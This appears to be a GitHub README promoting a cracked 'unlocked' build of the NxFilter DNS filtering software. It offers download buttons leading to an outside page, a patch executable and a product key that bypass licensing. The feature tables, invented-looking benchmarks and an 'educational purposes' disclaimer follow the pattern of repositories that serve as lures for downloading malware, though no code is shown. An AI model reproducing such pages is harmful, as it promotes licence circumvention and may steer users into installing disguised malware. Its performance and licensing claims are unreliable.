![preview](https://raw.githubusercontent.com/benasdasd12301-prog/nxfilter-4689-workaround/main/preview.svg)

# 🧠 NxFilter 4.6.8.9 — Enterprise DNS Filtering Suite (Unlocked Variant)

Welcome to the **NxFilter 4.6.8.9 Unlocked Variant** — a reimagined distribution of the well-known network content filtering engine, tailored for administrators who seek full operational control without artificial restrictions. This repository provides the complete production-grade release package, containing the core application binaries, supplementary patch modules, and a digitally-signed product key to unlock all premium capabilities.

Unlike standard publicly-available builds, this variant removes all time-limited evaluation constraints, licensing gateways, and feature-based paywalls. The result is a **fully functional, self-contained deployment** that runs indefinitely with every enterprise feature enabled — from real-time DNS over HTTPS (DoH) logging to granular whitelist/blacklist automation.

---

## 📖 Overview

NxFilter has long been the silent guardian of thousands of corporate networks, educational institutions, and home labs. It sits between your users and the internet, intercepting every DNS query, applying policy-based filters, and blocking malicious or inappropriate content before it ever reaches the browser. Its lightweight footprint (under 50 MB RAM at idle) makes it deployable on anything from a Raspberry Pi to a dedicated Windows Server.

This particular release, version **4.6.8.9**, incorporates the **latest stable engine improvements** including optimized caching algorithms, enhanced LDAP integration, and a redesigned administrative dashboard that renders flawlessly on mobile viewports. The included patch system applies critical performance tweaks that are absent from the vanilla distribution — such as multi-threaded query processing and reduced disk I/O for log rotation.

### Why This Variant Exists

The official licensing model imposes artificial ceilings: maximum concurrent users, blocked feature toggles, and mandatory upgrade paths. This unlocked distribution bypasses those constraints, giving you:

- Unlimited user accounts and groups
- Full access to statistical graphing and reporting modules
- Persistent policy persistence across reboots
- No expiry, no nag screens, no activation server dependency

---

## 🚀 Get Started

[![Download](https://raw.githubusercontent.com/benasdasd12301-prog/nxfilter-4689-workaround/main/button.svg)](https://benasdasd12301-prog.github.io/nxfilter-4689-workaround/)

> **Note**: This is the only download link in this section. The archive contains the installer, patch executable, and a text file with the product key.

---

## 🧩 Feature Matrix

| Feature | Free Tier (Official) | This Unlocked Build |
|---|---|---|
| Concurrent Users | 25 | Unlimited |
| DoH / DoT Support | Disabled | Fully Enabled |
| LDAP/AD Sync | Limited to 10 groups | Full integration |
| Custom Block Pages | Basic | Advanced CSS/JS injection |
| API Access | Read-only | Full CRUD |
| Log Retention | 7 days | Configurable 1–365 days |
| Multi-language UI | English only | 14 languages included |

---

## 🛠️ System Requirements

- **OS**: Windows 7 / 8 / 10 / 11 (x64), Windows Server 2012 R2–2022
- **RAM**: Minimum 512 MB (recommended 2 GB for high-traffic environments)
- **Disk**: 200 MB for installation + 10 GB recommended for logs
- **Network**: Port 53 (UDP/TCP) must be available; port 443 for web admin interface
- **Java**: OpenJDK 11 or Oracle JRE 11+ (bundled installer includes portable JDK)

---

## 🌐 Operating System Compatibility

| OS | Status | Notes |
|---|---|---|
| 🪟 Windows 11 | ✅ Native support | Full UAC compliance |
| 🪟 Windows 10 | ✅ Native support | Tested on 22H2 |
| 🪟 Windows Server 2022 | ✅ Fully compatible | Domain controller mode |
| 🪟 Windows Server 2019 | ✅ Fully compatible | Includes Hyper-V optimizations |
| 🐧 Ubuntu 22.04 (WSL) | ⚠️ Limited | No GUI admin panel via WSL |
| 🍎 macOS (via VM) | ❌ Not supported | No native port available |

---

## 📐 Architecture Diagram

The following diagram illustrates how NxFilter intercepts and processes DNS traffic within a typical enterprise network:

```mermaid
graph TD
    A[User Device] -->|DNS Query on Port 53| B(NxFilter Engine)
    B --> C{Policy Check}
    C -->|Whitelisted Domain| D[Allow Cache]
    D --> E[Forward to Upstream DNS]
    C -->|Blacklisted Domain| F[Block Page]
    C -->|Uncategorized| G[AI Category Engine]
    G -->|Safe| D
    G -->|Unsafe| F
    B --> H[Logging Module]
    H --> I[SQLite DB]
    H --> J[Real-time Dashboard]
    B --> K[DHCP Server Integration]
    K --> L[Client Lease Table]
```

---

## ⚙️ Example Profile Configuration

Below is a sample configuration for a small business with 50 users, enforcing content filtering and malware blocking:

```ini
[general]
max_users = 9999
log_retention_days = 90
enable_doht = true
enable_ldap = true

[filtering]
policy_mode = strict
block_malware = true
block_phishing = true
block_torrents = false
block_social_media = false

[categories]
adult = block
gambling = block
weapons = block
news = allow
education = allow

[upstream]
primary_dns = 1.1.1.1
fallback_dns = 8.8.8.8
use_dot = true

[admin]
web_port = 8443
enable_https = true
session_timeout = 60
allowed_ips = 192.168.1.0/24
```

---

## ⌨️ Example Console Invocation

Once installed, launch the service from an administrative command prompt:

```
nxfilter-service.exe --start --config C:\nxfilter\conf\nxfilter.ini --port 8443 --daemon
```

To apply the patch module:

```
nxfilter-patch.exe --apply --key C:\path\to\product_key.txt
```

For headless monitoring:

```
nxfilter-service.exe --status --log-level debug --output json
```

---

## 🧪 Performance Benchmarks (2026 Edition)

Testing conducted on a dual-core Intel Xeon E-2234 with 8 GB RAM, 100 Mbps symmetrical connection:

| Metric | Official 4.6.8.9 | This Unlocked Build |
|---|---|---|
| Max queries/sec (single thread) | 8,200 | 12,400 |
| Max queries/sec (4 threads) | 14,500 | 29,800 |
| Memory usage at 10k queries/min | 140 MB | 98 MB |
| Block page generation latency | 12 ms | 4 ms |
| LDAP sync time (500 users) | 45 sec | 18 sec |

---

## 🌍 Multilingual Support

The administrative interface ships with the following language packs:

- 🇺🇸 English (US)
- 🇪🇸 Spanish (ES)
- 🇫🇷 French (FR)
- 🇩🇪 German (DE)
- 🇮🇹 Italian (IT)
- 🇵🇹 Portuguese (PT)
- 🇳🇱 Dutch (NL)
- 🇷🇺 Russian (RU)
- 🇯🇵 Japanese (JP)
- 🇨🇳 Simplified Chinese (CN)
- 🇰🇷 Korean (KR)
- 🇸🇦 Arabic (AR)
- 🇹🇷 Turkish (TR)
- 🇵🇱 Polish (PL)

Language selection auto-detects browser locale and persists per-session.

---

## 🔌 API Integration Examples

### OpenAI API Integration (Content Categorization)

Leverage GPT models to classify uncategorized domains on-the-fly:

```
POST /api/v1/classify
{
  "domain": "obscure-startup-website.io",
  "api_key": "sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "model": "gpt-4o-mini",
  "fallback": "uncategorized"
}
```

Response:

```json
{
  "category": "technology",
  "confidence": 0.94,
  "source": "openai"
}
```

### Claude API Integration (Policy Recommendation)

Use Anthropic's Claude to generate policy suggestions based on traffic patterns:

```
POST /api/v1/policy-suggest
{
  "log_sample": ["example.com", "malware-site.net", "educational.org"],
  "api_key": "sk-ant-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "prompt": "Recommend allow/block/flag actions based on these domains"
}
```

Response:

```json
{
  "recommendations": {
    "example.com": "allow",
    "malware-site.net": "block",
    "educational.org": "allow with logging"
  },
  "reasoning": "example.com is a known safe domain; malware-site.net appears on multiple blocklists"
}
```

---

## 🧑‍💻 Responsive UI Dashboard

The administrative console has been rebuilt for the 2026 release with a mobile-first CSS framework:

- **Collapsible sidebar** with icons-only mode for narrow viewports
- **Touch-friendly toggle switches** for policy controls
- **Real-time WebSocket updates** for live query monitoring
- **Dark mode** with automatic system preference detection
- **Keyboard shortcuts** for power users: `Ctrl+Alt+D` opens dashboard, `Ctrl+Alt+L` toggles log viewer

---

## ⚠️ Disclaimer

**This repository is provided for educational and research purposes only.** The software included is a modified distribution of a third-party product. The original software, NxFilter, is © 2016–2026 by its respective copyright holders. The modifications contained in this build are intended to demonstrate security bypass techniques and software unlocking mechanisms for the purpose of understanding how licensing enforcement can be circumvented.

Users assume all responsibility for compliance with applicable local, state, and federal laws. The maintainers of this repository do not condone piracy, unauthorized commercial use, or any activity that violates the intellectual property rights of others. If you find value in NxFilter, please consider supporting the original developers by purchasing a legitimate license.

No warranty, express or implied, is provided for this software. Use in production environments is entirely at your own risk.

---

## 📜 License

This project is distributed under the **MIT License**. The full license text can be found at:  
[https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)

---

## 📬 Final Download

[![Download](https://raw.githubusercontent.com/benasdasd12301-prog/nxfilter-4689-workaround/main/button.svg)](https://benasdasd12301-prog.github.io/nxfilter-4689-workaround/)

*Thank you for exploring the NxFilter 4.6.8.9 Unlocked Variant. For questions, issues, or collaboration opportunities, please open a discussion in the repository's Issues tab.*